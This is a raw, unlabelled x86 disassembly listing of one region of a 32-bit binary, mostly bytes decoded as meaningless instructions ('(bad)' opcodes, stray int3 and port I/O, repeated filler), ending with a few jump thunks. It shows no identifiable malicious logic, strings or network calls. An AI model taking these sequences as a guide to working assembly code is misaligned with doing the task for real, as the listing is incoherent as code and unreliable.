  419863:	xor    DWORD PTR [ebx],ecx
  419865:	add    BYTE PTR [eax],al
  419867:	add    esp,DWORD PTR [ecx]
  419869:	sahf   
  41986a:	dec    BYTE PTR [esi+0x35c48116]
  419870:	push   ecx
  419871:	add    BYTE PTR [edx],al
  419873:	icebp  
  419874:	or     BYTE PTR [ebx],ch
  419876:	add    BYTE PTR [ebx],dh
  419878:	or     DWORD PTR [eax],eax
  41987a:	mov    edi,DWORD PTR [edi*8-0x1dcebe89]
  419881:	(bad)  
  419882:	mov    DWORD PTR [ecx*8-0x7dcebe89],ebp
  419889:	adc    eax,DWORD PTR [ecx+ecx*8-0x39]
  41988d:	call   DWORD PTR [ecx-0x70]
  419890:	std    
  419891:	ja     0x4198d4
  419893:	xor    DWORD PTR [ecx-0x47beb278],edi
  419899:	out    0x9d,eax
  41989b:	sub    eax,0xed83fd16
  4198a0:	add    al,0x89
  4198a2:	adc    eax,0x3e9145
  4198a7:	add    BYTE PTR [edx],dh
  4198a9:	mov    esp,0x21648907
  4198ae:	mov    DWORD PTR [ebp+0x19],edx
  4198b1:	push   ss
  4198b2:	loop   0x41983f
  4198b4:	adc    al,0xb4
  4198b6:	ror    ah,0xe5
  4198b9:	inc    esp
  4198ba:	int3   
  4198bb:	int3   
  4198bc:	test   BYTE PTR [edx+0x16c8bec],al
  4198c2:	cmp    DWORD PTR [ebp+0x2d],eax
  4198c5:	call   0x5e9:0x16c8b04
  4198cc:	fimul  DWORD PTR [ecx]
  4198ce:	mov    DWORD PTR [ebp+0x35],eax
  4198d1:	mov    ah,0xc0
  4198d3:	int3   
  4198d4:	in     eax,dx
  4198d5:	inc    esp
  4198d6:	int3   
  4198d7:	int3   
  4198d8:	in     eax,0x44
  4198da:	int3   
  4198db:	int3   
  4198dc:	add    al,0x82
  4198de:	in     al,dx
  4198df:	adc    DWORD PTR [ebp-0x62ba3b1c],0x8
  4198e6:	nop
  4198e7:	add    DWORD PTR [ecx],esi
  4198e9:	add    BYTE PTR [ebx+0x8],0xb8
  4198ed:	retf   
  4198ee:	xlat   BYTE PTR ds:[ebx]
  4198ef:	mov    esi,esp
  4198f1:	xor    BYTE PTR [ecx+0x4f0a2955],cl
  4198f7:	cmp    al,0xa8
  4198f9:	mov    ebx,0x28f48bdf
  4198fe:	or     eax,0x88fcf9b7
  419903:	push   ebp
  419904:	push   ecx
  419905:	add    DWORD PTR [edx+ecx*1+0x39],0xffffff80
  41990a:	inc    ebx
  41990b:	call   0x13e7210
  419910:	inc    eax
  419911:	xor    DWORD PTR [edx-0x3846c3f5],eax
  419917:	call   DWORD PTR [eax+0x49]
  41991a:	(bad)  
  41991d:	cs mov esp,eax
  419920:	or     BYTE PTR [eax+0x716aefce],bh
  419926:	mov    eax,ds:0x9312fff
  41992b:	push   0xaa100
  419930:	push   0x31
  419932:	adc    al,0x53
  419934:	lock test al,0xce
  419937:	jecxz  0x4198c4
  419939:	pop    esp
  41993a:	sub    DWORD PTR [ecx-0x77467abe],ecx
  419940:	dec    ebp
  419941:	cmp    DWORD PTR [edx-0x482aaa78],edi
  419947:	out    0xc1,eax
  419949:	aam    0x14
  41994b:	std    
  41994c:	xor    ebp,0x5
  41994f:	lds    eax,FWORD PTR [ebp-0x43]
  419952:	or     DWORD PTR [eax],eax
  419954:	add    BYTE PTR [ecx],dh
  419956:	and    BYTE PTR [edi],al
  419958:	mov    ebp,DWORD PTR [ebp+ebx*1-0x7f]
  41995c:	shl    BYTE PTR [eax],0x82
  41995f:	inc    ebx
  419960:	hlt    
  419961:	mov    edx,0xe60fdfc6
  419966:	mov    edx,0x1cfc3905
  41996b:	jno    0x4199c6
  41996d:	mov    edx,0x83e7ce
  419972:	or     ebp,edi
  419974:	push   DWORD PTR [ebx-0xc]
  419977:	jg     0x4199c4
  419979:	call   0x512c30
  41997e:	in     eax,0xd4
  419980:	mov    BYTE PTR [ebp+0x59],dl
  419983:	add    BYTE PTR [edx+0x10],0xaa
  419987:	(bad)  
  419988:	fisttp WORD PTR [ebx+0x448ad500]
  41998e:	and    DWORD PTR [ecx+ecx*4],edx
  419991:	dec    ebp
  419992:	push   ecx
  419993:	fcom   st(1)
  419995:	test   eax,0x515588d4
  41999b:	add    al,0xad
  41999d:	inc    edx
  41999e:	ins    DWORD PTR es:[edi],dx
  41999f:	mov    ecx,0x80194588
  4199a4:	dec    ebx
  4199a5:	or     BYTE PTR [edx],dh
  4199a7:	rcl    DWORD PTR [ebx],0x51
  4199aa:	stos   BYTE PTR es:[edi],al
  4199ab:	mov    ebp,0x2d748be7
  4199b0:	add    DWORD PTR [edx+0x35],eax
  4199b3:	mov    ecx,0x13fc55e7
  4199b8:	std    
  4199b9:	sub    ebp,0x4
  4199bc:	mov    DWORD PTR [ebp-0x27],ecx
  4199bf:	xchg   DWORD PTR [edi-0x183a47d8],edi
  4199c5:	jmp    0x41998a
  4199c7:	jg     0x419a1c
  4199c9:	in     al,0x83
  4199cb:	and    DWORD PTR [esi],ecx
  4199cd:	cld    
  4199ce:	into   
  4199cf:	adc    eax,DWORD PTR [ecx+0x23a12dc4]
  4199d5:	add    eax,DWORD PTR [eax]
  4199d7:	jno    0x4199e2
  4199d9:	lahf   
  4199da:	cmp    al,0x39
  4199dc:	retf   0x4fff
  4199df:	cdq    
  4199e0:	jg     0x4199dc
  4199e2:	jmp    DWORD PTR [esi-0x57f73b79]
  4199e8:	int    0xdb
  4199ea:	adc    DWORD PTR [ecx+edx*8+0x77],0x41
  4199ef:	xor    DWORD PTR [ecx],ecx
  4199f1:	jae    0x4199fd
  4199f3:	mov    edx,0xf0783005
  4199f8:	or     BYTE PTR [edi-0x1],cl
  4199fb:	fdiv   QWORD PTR [ecx+eax*4]
  4199fe:	cmp    eax,0x3e9129
  419a03:	xor    DWORD PTR [esi-0x5f0e95e5],ebx
  419a09:	jmp    FWORD PTR [edi]
  419a0b:	xor    DWORD PTR [ecx],ecx
  419a0d:	mov    DWORD PTR [ebp+0x4d],edx
  419a10:	mov    dh,0x88
  419a12:	inc    ebp
  419a13:	push   ecx
  419a14:	jg     0x419a5e
  419a16:	xor    al,0xe0
  419a18:	adc    edx,DWORD PTR [ebx-0x10]
  419a1b:	xchg   edx,eax
  419a1c:	cld    
  419a1d:	ja     0x419a60
  419a1f:	xor    DWORD PTR [esi],ebx
  419a21:	adc    ebp,DWORD PTR [edx+0x71]
  419a24:	mov    eax,ds:0x9312fff
  419a29:	mov    DWORD PTR [ebp+0x15],edx
  419a2c:	mov    eax,0xbd0e0069
  419a31:	out    dx,eax
  419a32:	mov    ds:0x3e911d,eax
  419a37:	mov    dl,0xd4
  419a39:	adc    edi,DWORD PTR [eax+0x0]
  419a3c:	jo     0x419a47
  419a3e:	add    BYTE PTR [ebp+0x44],dh
  419a41:	lahf   
  419a42:	aas    
  419a43:	push   0xffffd931
  419a48:	stos   BYTE PTR es:[edi],al
  419a49:	int3   
  419a4a:	sti    
  419a4b:	push   eax
  419a4c:	dec    ebx
  419a4d:	or     ebp,edi
  419a4f:	push   ebp
  419a50:	shl    DWORD PTR [esi+0x14],0x78
  419a54:	jo     0x419a5f
  419a56:	mov    DWORD PTR [ebp-0x2b],ecx
  419a59:	or     BYTE PTR [ebx-0x28],0xaa
  419a5d:	mov    esp,0x30f48bd7
  419a62:	add    DWORD PTR [edx+0x65],eax
  419a65:	add    BYTE PTR [ebx-0x20],0xaa
  419a69:	(bad)  
  419a6a:	sti    
  419a6b:	push   ecx
  419a6c:	stos   BYTE PTR es:[edi],al
  419a6d:	mov    esp,0xfdd052e3
  419a72:	ja     0x419ab5
  419a74:	xor    DWORD PTR [ecx+0x127d95e7],edi
  419a7a:	std    
  419a7b:	sub    DWORD PTR [ebp+0x5],0xffffff89
  419a7f:	dec    ebp
  419a80:	push   ecx
  419a81:	xchg   BYTE PTR [edi+0x931a4],dh
  419a87:	add    ch,ah
  419a89:	into   
  419a8a:	mov    BYTE PTR [ebp+0x51],dl
  419a8d:	jle    0x419ad2
  419a8f:	fdiv   DWORD PTR [edx]
  419a91:	xchg   DWORD PTR [eax-0x78f6cf00],esp
  419a97:	inc    ebp
  419a98:	dec    ebp
  419a99:	jle    0x419ae6
  419a9b:	loopne 0x419a47
  419a9d:	cld    
  419a9e:	adc    edi,DWORD PTR [eax+0x0]
  419aa1:	jo     0x419aac
  419aa3:	sub    DWORD PTR [ecx+0x5d],edx
  419aa6:	adc    BYTE PTR [ebx],0x44
  419aa9:	cdq    
  419aaa:	enter  0xa0ff,0x6d
  419aae:	xchg   ecx,eax
  419aaf:	add    BYTE PTR ds:[ecx+0x7e],ah
  419ab3:	or     edx,DWORD PTR [ecx+ecx*4]
  419ab6:	enter  0x50ff,0xaa
  419aba:	mov    ebx,0x920952eb
  419abf:	stc    
  419ac0:	(bad)  
  419ac1:	out    dx,al
  419ac2:	test   esp,eax
  419ac4:	or     al,0xba
  419ac6:	retf   
  419ac7:	fisttp WORD PTR [ebx+0x4177fd2c]
  419acd:	xor    DWORD PTR [esi],eax
  419acf:	dec    eax
  419ad0:	sub    BYTE PTR [eax+0x70785403],bh
  419ad6:	or     DWORD PTR [ecx+0x3e90f93d],eax
  419adc:	add    BYTE PTR [ecx],dh
  419ade:	pushf  
  419adf:	sub    cl,BYTE PTR [ebx+0x4177fd44]
  419ae5:	xor    DWORD PTR [edi-0x37e6ab62],esi
  419aeb:	dec    DWORD PTR [edi-0x56]
  419aee:	add    esi,DWORD PTR [eax]
  419af0:	js     0x419ae2
  419af2:	or     BYTE PTR [edi-0x18],cl
  419af5:	or     DWORD PTR ds:0x4cb2fffd,edx
  419afb:	or     al,0x8b
  419afd:	sbb    al,0xfd
  419aff:	ja     0x419b42
  419b01:	xor    DWORD PTR [edi+0x680049e7],esi
  419b07:	adc    ebp,edi
  419b09:	xor    DWORD PTR [ebp+0xc],0xffffffe9
  419b0d:	popa   
  419b0e:	leave  
  419b0f:	fadd   QWORD PTR [eax]
  419b11:	inc    eax
  419b12:	xor    DWORD PTR [eax+0x3c],ebp
  419b15:	js     0x419b07
  419b17:	or     BYTE PTR [eax-0x18],dl
  419b1a:	in     eax,0xf
  419b1c:	std    
  419b1d:	push   DWORD PTR [edx+0x7489084c]
  419b23:	xor    eax,0x913d0d89
  419b28:	add    BYTE PTR ds:[eax-0x2f1fac7c],al
  419b2f:	cmc    
  419b30:	ja     0x419b73
  419b32:	xor    DWORD PTR [edx+eax*2],ecx
  419b35:	sub    BYTE PTR [ecx-0x7c],ah
  419b38:	or     esi,DWORD PTR [eax]
  419b3a:	jns    0x419b06
  419b3c:	call   DWORD PTR [eax+0x9]
  419b3f:	loope  0x419b3c
  419b41:	(bad)  
  419b42:	out    dx,al
  419b43:	mov    esp,es
  419b45:	or     al,0xba
  419b47:	imul   BYTE PTR [edi]
  419b49:	js     0x419bbb
  419b4b:	or     DWORD PTR [edi-0x3e],edi
  419b4e:	rcl    DWORD PTR [esi-0x9470002],0x5b
  419b55:	js     0x419bc7
  419b57:	or     DWORD PTR [ebx+0x69b9b945],ecx
  419b5d:	inc    eax
  419b5e:	dec    ebx
  419b5f:	pop    es
  419b60:	mov    DWORD PTR ds:0x3e910d,ecx
  419b66:	add    BYTE PTR [eax],dl
  419b68:	push   ebx
  419b69:	aam    0x0
  419b6b:	mov    DWORD PTR [ecx+edi*8],ebp
  419b6e:	call   DWORD PTR [esi+0x31ffff51]
  419b74:	or     DWORD PTR [ecx+0x44ae4e5],ecx
  419b7a:	add    BYTE PTR [ebp+0x3d],ch
  419b7d:	int3   
  419b7e:	int3   
  419b7f:	gs cmp eax,0x8404cccc
  419b85:	in     al,dx
  419b86:	mov    ebp,esp
  419b88:	add    BYTE PTR [ecx-0x3f51a2c0],cl
  419b8e:	int3   
  419b8f:	gs cmp eax,0x83e4cccc
  419b95:	in     al,dx
  419b96:	push   ebx
  419b97:	fbstp  TBYTE PTR [edi-0x6eeec278]
  419b9d:	add    BYTE PTR ds:[edx+0x70782bee],ch
  419ba4:	or     DWORD PTR [ecx+0x3e914935],ecx
  419baa:	add    BYTE PTR [esi-0x51],bh
  419bad:	pop    eax
  419bae:	pop    ebp
  419baf:	repnz cmp al,0xcc
  419bb2:	int3   
  419bb3:	fs test ah,ch
  419bb6:	push   ecx
  419bb7:	cdq    
  419bb8:	lds    eax,FWORD PTR [eax]
  419bba:	inc    eax
  419bbb:	xor    DWORD PTR [edx+0x3c],ebp
  419bbe:	js     0x419c30
  419bc0:	or     DWORD PTR [eax-0x18],edx
  419bc3:	popf   
  419bc4:	adc    ch,bh
  419bc6:	push   DWORD PTR [edx+0x74890844]
  419bcc:	or     eax,0x29004d89
  419bd1:	mov    edx,0xf5ba0069
  419bd6:	push   edi
  419bd7:	js     0x419c49
  419bd9:	or     DWORD PTR [edx-0x1],edx
  419bdc:	fs or  eax,0x4c54e589
  419be2:	int3   
  419be3:	int3   
  419be4:	add    al,0x84
  419be6:	in     al,dx
  419be7:	adc    DWORD PTR [ebp-0x66ba3b1c],0x8
  419bee:	add    BYTE PTR [eax],al
  419bf0:	xor    DWORD PTR [eax+0x43],ecx
  419bf3:	fmul   QWORD PTR [ecx]
  419bf5:	or     DWORD PTR [eax],eax
  419bf7:	add    BYTE PTR [esi-0x3b],ch
  419bfa:	repz add DWORD PTR [ecx],esi
  419bfd:	or     DWORD PTR [eax],eax
  419bff:	(bad)  
  419c00:	in     al,dx
  419c01:	or     al,0x0
  419c03:	add    BYTE PTR [ecx],dh
  419c05:	or     ebp,eax
  419c07:	inc    ebp
  419c08:	dec    ebp
  419c09:	or     BYTE PTR [eax],al
  419c0b:	add    BYTE PTR [ecx],dh
  419c0d:	test   BYTE PTR [ebx+0x8],cl
  419c10:	test   al,0xfd
  419c12:	das    
  419c13:	js     0x419c05
  419c15:	or     al,ch
  419c17:	test   eax,0xa1fd0f3e
  419c1c:	add    DWORD PTR [ecx+0x100c003e],edx
  419c22:	std    
  419c23:	add    BYTE PTR [ecx],dh
  419c25:	xchg   ebp,eax
  419c26:	or     eax,edi
  419c28:	sub    al,0xd1
  419c2a:	ja     0x419c6d
  419c2c:	xor    DWORD PTR [ecx],ecx
  419c2e:	add    BYTE PTR [eax],al
  419c30:	xor    DWORD PTR [edx],esp
  419c32:	or     al,bh
  419c34:	add    BYTE PTR [ecx+edx*8],dh
  419c37:	ja     0x419c7a
  419c39:	xor    DWORD PTR [eax],ecx
  419c3b:	add    BYTE PTR [eax],al
  419c3d:	xor    DWORD PTR [edx-0x3786cfc5],ecx
  419c43:	(bad)  
  419c44:	jmp    DWORD PTR [ebx+eax*1-0x3b]
  419c48:	add    eax,0x3e9129
  419c4d:	xor    DWORD PTR [ecx],ecx
  419c4f:	add    BYTE PTR [eax],al
  419c51:	mov    dl,0xcc
  419c53:	aaa    
  419c54:	js     0x419cc6
  419c56:	or     DWORD PTR [eax],eax
  419c58:	jne    0x419c8e
  419c5a:	mov    ds:0x924feff,eax
  419c5f:	js     0x419ca2
  419c61:	xor    DWORD PTR [edx+0x30],ebp
  419c64:	js     0x419c56
  419c66:	or     BYTE PTR [ecx+0x3e91610d],cl
  419c6c:	add    BYTE PTR [eax+0x3c8be7bc],ch
  419c72:	fnstenv [edi+0x41]
  419c75:	xor    DWORD PTR [edx-0x34cd17bd],eax
  419c7b:	cmp    ecx,DWORD PTR [ecx+0x4d8920f4]
  419c81:	mov    DWORD PTR [eax-0x3816e3f5],eax
  419c87:	jmp    DWORD PTR [edi+0x1]
  419c8a:	or     al,BYTE PTR [eax+0x0]
  419c8d:	pop    esi
  419c8e:	hlt    
  419c8f:	push   DWORD PTR [edi-0x10]
  419c92:	or     BYTE PTR [ecx-0x3836c4],ah
  419c98:	mov    BYTE PTR [eax],0x2c
  419c9b:	mov    ebp,0x94314177
  419ca0:	add    BYTE PTR [eax+0x31],al
  419ca3:	mov    eax,ds:0x971035f
  419ca8:	mov    DWORD PTR ds:0x3e9165,edx
  419cae:	and    DWORD PTR [ecx],0xffffffc2
  419cb1:	not    DWORD PTR [esi]
  419cb3:	push   cs
  419cb4:	add    esp,0x78486a39
  419cba:	jo     0x419cc5
  419cbc:	std    
  419cbd:	adc    eax,0x3e9169
  419cc2:	shl    BYTE PTR [eax+0x68314177],cl
  419cc8:	dec    esp
  419cc9:	js     0x419d3b
  419ccb:	or     DWORD PTR [eax-0x18],edx
  419cce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419ccf:	push   cs
  419cd0:	std    
  419cd1:	push   DWORD PTR [edx+0x74890444]
  419cd7:	sbb    DWORD PTR [ecx-0x18483eb3],ecx
  419cdd:	aad    0xbf
  419cdf:	or     eax,0x4ed83fd
  419ce4:	mov    eax,ds:0xffc82934
  419ce9:	mov    bh,ah
  419ceb:	sbb    BYTE PTR [edx+0x6a],dl
  419cee:	xor    DWORD PTR [eax+0x34],ebp
  419cf1:	js     0x419ce3
  419cf3:	or     BYTE PTR [eax-0x18],dl
  419cf6:	lods   eax,DWORD PTR ds:[esi]
  419cf7:	adc    eax,0x44b2fffd
  419cfc:	or     al,0x8b
  419cfe:	add    ah,ch
  419d00:	sbb    BYTE PTR [edi+0x5381914d],al
  419d06:	cld    
  419d07:	sub    dh,BYTE PTR [edi+ebp*8+0x43820b73]
  419d0e:	loopne 0x419d11
  419d10:	or     BYTE PTR [ebx-0x24],0x0
  419d14:	and    DWORD PTR [esi-0x7ef2b105],ebp
  419d1a:	les    edi,FWORD PTR [ecx]
  419d1c:	push   0x40
  419d1e:	js     0x419d10
  419d20:	or     BYTE PTR [ecx+0x3e90f115],cl
  419d26:	add    BYTE PTR [ebx+0x70784c6a],al
  419d2c:	or     DWORD PTR [ecx],eax
  419d2e:	inc    ebp
  419d2f:	adc    eax,0x5d0d88ba
  419d34:	xchg   ecx,eax
  419d35:	add    BYTE PTR ds:[edx],dh
  419d38:	mov    esi,0x351951fb
  419d3d:	idiv   edi
  419d3f:	dec    BYTE PTR [eax-0x4955f33c]
  419d45:	repz add eax,DWORD PTR [ebp+ebp*1-0x7d32aaff]
  419d4d:	push   ebx
  419d4e:	in     al,0xaa
  419d50:	(bad)  
  419d51:	sti    
  419d52:	add    ebp,DWORD PTR [ebp+ebp*1-0x79]
  419d56:	inc    ebp
  419d57:	int    0x80
  419d59:	dec    ebx
  419d5a:	loopne 0x419d76
  419d5c:	(bad)  
  419d5d:	aas    
  419d5e:	js     0x419dd0
  419d60:	or     DWORD PTR [edi+0x20d1004d],eax
  419d66:	sahf   
  419d67:	(bad)  
  419d68:	hlt    
  419d69:	adc    BYTE PTR [eax],al
  419d6b:	add    BYTE PTR [ecx],dh
  419d6d:	or     ecx,ebp
  419d6f:	or     DWORD PTR [edx+0x7383f7b6],ebp
  419d75:	add    eax,0x80895587
  419d7a:	inc    ebx
  419d7b:	clc    
  419d7c:	dec    edx
  419d7d:	(bad)  
  419d7e:	out    dx,eax
  419d7f:	jae    0x419dba
  419d81:	or     BYTE PTR [ebx],0x34
  419d84:	stc    
  419d85:	leave  
  419d86:	inc    DWORD PTR [edx]
  419d88:	cld    
  419d89:	adc    BYTE PTR [ecx-0x849cdef],cl
  419d8f:	mov    eax,ds:0x3e9125
  419d94:	xor    al,dh
  419d96:	test   DWORD PTR [ecx-0x7b47fdf],0x3e74ab0
  419da0:	xor    DWORD PTR [ecx],ecx
  419da2:	mov    DWORD PTR ds:0x3e90fd,edx
  419da8:	xor    dh,BYTE PTR [esi+0x6a3b33f7]
  419dae:	xor    al,0x78
  419db0:	jo     0x419dbb
  419db2:	add    DWORD PTR [ebp+0x19],eax
  419db5:	or     BYTE PTR [eax],0xeb
  419db8:	mov    BYTE PTR [ecx-0x3576dbd5],0xff
  419dbf:	mov    BYTE PTR [ecx+ebp*8],bh
  419dc2:	ja     0x419e05
  419dc4:	xor    eax,ebx
  419dc6:	(bad)  
  419dc7:	mov    DWORD PTR [eax],eax
  419dc9:	and    al,0xf1
  419dcb:	ja     0x419e0e
  419dcd:	xor    eax,ebx
  419dcf:	(bad)  
  419dd0:	mov    DWORD PTR [ebx*8+0x21314177],edi
  419dd7:	dec    esi
  419dd8:	test   esi,0x960d8b0b
  419dde:	xchg   ebx,eax
  419ddf:	add    BYTE PTR ds:[eax+0x31b9f7bd],ch
  419de6:	pop    es
  419de7:	inc    eax
  419de8:	add    BYTE PTR [eax+0x31020021],dh
  419dee:	or     DWORD PTR [ecx-0x312066ab],ecx
  419df4:	mov    DWORD PTR [ecx+eiz*8],edi
  419df7:	ja     0x419e3a
  419df9:	xor    DWORD PTR [edx+0x28],ebp
  419dfc:	js     0x419dee
  419dfe:	or     BYTE PTR [eax-0x18],dl
  419e01:	xor    eax,0xb2fffd0f
  419e06:	inc    esp
  419e07:	add    al,0x8b
  419e09:	cmp    al,0xd5
  419e0b:	ja     0x419e4e
  419e0d:	xor    DWORD PTR [edx+0xb5bd5e7],edi
  419e13:	std    
  419e14:	test   DWORD PTR [ecx-0x6b],esi
  419e17:	add    esi,DWORD PTR [ebx]
  419e19:	jno    0x419e3a
  419e1b:	sub    cl,BYTE PTR [ebx+0x4177e50c]
  419e21:	xor    DWORD PTR [eax-0x324dfb3c],ecx
  419e27:	aaa    
  419e28:	js     0x419e9a
  419e2a:	or     DWORD PTR [eax],eax
  419e2c:	je     0x419e2e
  419e2e:	cmp    BYTE PTR [eax+0x14],ch
  419e31:	js     0x419ea3
  419e33:	or     DWORD PTR [edi-0x17fab2bc],eax
  419e39:	pop    ebp
  419e3a:	or     al,0xb
  419e3c:	std    
  419e3d:	mov    ebx,DWORD PTR [esi*4-0x48cebe89]
  419e44:	shl    BYTE PTR [ebx],0xf1
  419e47:	jle    0x419e2c
  419e49:	pop    ebp
  419e4a:	repnz cmp eax,0x931cccc
  419e50:	add    BYTE PTR [eax],al
  419e52:	xor    DWORD PTR [ecx],ecx
  419e54:	add    BYTE PTR [eax],al
  419e56:	xor    DWORD PTR [ecx],ecx
  419e58:	add    BYTE PTR [eax],al
  419e5a:	xor    DWORD PTR [ecx],ecx
  419e5c:	add    BYTE PTR [eax],al
  419e5e:	xor    DWORD PTR [ecx],ecx
  419e60:	add    BYTE PTR [eax],al
  419e62:	xor    DWORD PTR [ecx],ecx
  419e64:	add    BYTE PTR [eax],al
  419e66:	xor    DWORD PTR [ecx],ecx
  419e68:	add    BYTE PTR [eax],al
  419e6a:	xor    DWORD PTR [ecx],ecx
  419e6c:	add    BYTE PTR [eax],al
  419e6e:	xor    DWORD PTR [ecx],ecx
  419e70:	add    BYTE PTR [eax],al
  419e72:	xor    DWORD PTR [ecx],ecx
  419e74:	add    BYTE PTR [eax],al
  419e76:	xor    DWORD PTR [ecx],ecx
  419e78:	add    BYTE PTR [eax],al
  419e7a:	xor    DWORD PTR [ecx],ecx
  419e7c:	add    BYTE PTR [eax],al
  419e7e:	xor    DWORD PTR [ecx],ecx
  419e80:	add    BYTE PTR [eax],al
  419e82:	xor    DWORD PTR [ecx],ecx
  419e84:	add    BYTE PTR [eax],al
  419e86:	xor    DWORD PTR [ecx],ecx
  419e88:	add    BYTE PTR [eax],al
  419e8a:	xor    DWORD PTR [ecx],ecx
  419e8c:	add    BYTE PTR [eax],al
  419e8e:	xor    DWORD PTR [ecx],ecx
  419e90:	add    BYTE PTR [eax],al
  419e92:	add    BYTE PTR [ecx],dh
  419e94:	or     DWORD PTR [eax],eax
  419e96:	add    BYTE PTR [ecx],dh
  419e98:	or     DWORD PTR [eax],eax
  419e9a:	add    BYTE PTR [ecx],dh
  419e9c:	or     DWORD PTR [eax],eax
  419e9e:	add    BYTE PTR [ecx],dh
  419ea0:	or     DWORD PTR [eax],eax
  419ea2:	add    BYTE PTR [ecx],dh
  419ea4:	or     DWORD PTR [eax],eax
  419ea6:	add    BYTE PTR [ecx],dh
  419ea8:	or     DWORD PTR [eax],eax
  419eaa:	add    BYTE PTR [ecx],dh
  419eac:	or     DWORD PTR [eax],eax
  419eae:	add    BYTE PTR [ecx],dh
  419eb0:	or     DWORD PTR [eax],eax
  419eb2:	add    BYTE PTR [ecx],dh
  419eb4:	or     DWORD PTR [eax],eax
  419eb6:	add    BYTE PTR [ecx],dh
  419eb8:	or     DWORD PTR [eax],eax
  419eba:	add    BYTE PTR [ecx],dh
  419ebc:	or     DWORD PTR [eax],eax
  419ebe:	add    BYTE PTR [ecx],dh
  419ec0:	or     DWORD PTR [eax],eax
  419ec2:	add    BYTE PTR [ecx],dh
  419ec4:	or     DWORD PTR [eax],eax
  419ec6:	add    BYTE PTR [ecx],dh
  419ec8:	or     DWORD PTR [eax],eax
  419eca:	add    BYTE PTR [ecx],dh
  419ecc:	or     DWORD PTR [eax],eax
  419ece:	add    BYTE PTR [ecx],dh
  419ed0:	or     DWORD PTR [eax],eax
  419ed2:	add    BYTE PTR [ecx],dh
  419ed4:	or     DWORD PTR [eax],eax
  419ed6:	add    BYTE PTR [ecx],dh
  419ed8:	or     DWORD PTR [eax],eax
  419eda:	add    BYTE PTR [ecx],dh
  419edc:	or     DWORD PTR [eax],eax
  419ede:	add    BYTE PTR [ecx],dh
  419ee0:	or     DWORD PTR [eax],eax
  419ee2:	add    BYTE PTR [ecx],dh
  419ee4:	or     DWORD PTR [eax],eax
  419ee6:	add    BYTE PTR [ecx],dh
  419ee8:	or     DWORD PTR [eax],eax
  419eea:	add    BYTE PTR [ecx],dh
  419eec:	or     DWORD PTR [eax],eax
  419eee:	add    BYTE PTR [ecx],dh
  419ef0:	or     DWORD PTR [eax],eax
  419ef2:	add    BYTE PTR [ecx],dh
  419ef4:	or     DWORD PTR [eax],eax
  419ef6:	add    BYTE PTR [eax],al
  419ef8:	xor    DWORD PTR [ecx],ecx
  419efa:	add    BYTE PTR [eax],al
  419efc:	xor    DWORD PTR [ecx],ecx
  419efe:	add    BYTE PTR [eax],al
  419f00:	xor    DWORD PTR [ecx],ecx
  419f02:	add    BYTE PTR [eax],al
  419f04:	xor    DWORD PTR [ecx],ecx
  419f06:	add    BYTE PTR [eax],al
  419f08:	xor    DWORD PTR [ecx],ecx
  419f0a:	add    BYTE PTR [eax],al
  419f0c:	xor    DWORD PTR [ecx],ecx
  419f0e:	add    BYTE PTR [eax],al
  419f10:	xor    DWORD PTR [ecx],ecx
  419f12:	add    BYTE PTR [eax],al
  419f14:	xor    DWORD PTR [ecx],ecx
  419f16:	add    BYTE PTR [eax],al
  419f18:	xor    DWORD PTR [ecx],ecx
  419f1a:	add    BYTE PTR [eax],al
  419f1c:	xor    DWORD PTR [ecx],ecx
  419f1e:	add    BYTE PTR [eax],al
  419f20:	xor    DWORD PTR [ecx],ecx
  419f22:	add    BYTE PTR [eax],al
  419f24:	xor    DWORD PTR [ecx],ecx
  419f26:	add    BYTE PTR [eax],al
  419f28:	xor    DWORD PTR [ecx],ecx
  419f2a:	add    BYTE PTR [eax],al
  419f2c:	xor    DWORD PTR [ecx],ecx
  419f2e:	add    BYTE PTR [eax],al
  419f30:	xor    DWORD PTR [ecx],ecx
  419f32:	add    BYTE PTR [eax],al
  419f34:	xor    DWORD PTR [ecx],ecx
  419f36:	add    BYTE PTR [eax],al
  419f38:	xor    DWORD PTR [ecx],ecx
  419f3a:	add    BYTE PTR [eax],al
  419f3c:	xor    DWORD PTR [ecx],ecx
  419f3e:	add    BYTE PTR [eax],al
  419f40:	xor    DWORD PTR [ecx],ecx
  419f42:	add    BYTE PTR [eax],al
  419f44:	xor    DWORD PTR [ecx],ecx
  419f46:	add    BYTE PTR [eax],al
  419f48:	xor    DWORD PTR [ecx],ecx
  419f4a:	add    BYTE PTR [eax],al
  419f4c:	xor    DWORD PTR [ecx],ecx
  419f4e:	add    BYTE PTR [eax],al
  419f50:	xor    DWORD PTR [ecx],ecx
  419f52:	add    BYTE PTR [eax],al
  419f54:	xor    DWORD PTR [ecx],ecx
  419f56:	add    BYTE PTR [eax],al
  419f58:	xor    DWORD PTR [ecx],ecx
  419f5a:	add    BYTE PTR [eax],al
  419f5c:	add    bh,bh
  419f5e:	and    eax,0x41a128
  419f63:	jmp    DWORD PTR ds:0x41a12c
  419f69:	jmp    DWORD PTR ds:0x41a130
  419f6f:	jmp    DWORD PTR ds:0x41a134
  419f75:	jmp    DWORD PTR ds:0x41a138
  419f7b:	jmp    DWORD PTR ds:0x41a13c
  419f81:	jmp    DWORD PTR ds:0x41a144
  419f87:	jmp    DWORD PTR ds:0x41a148
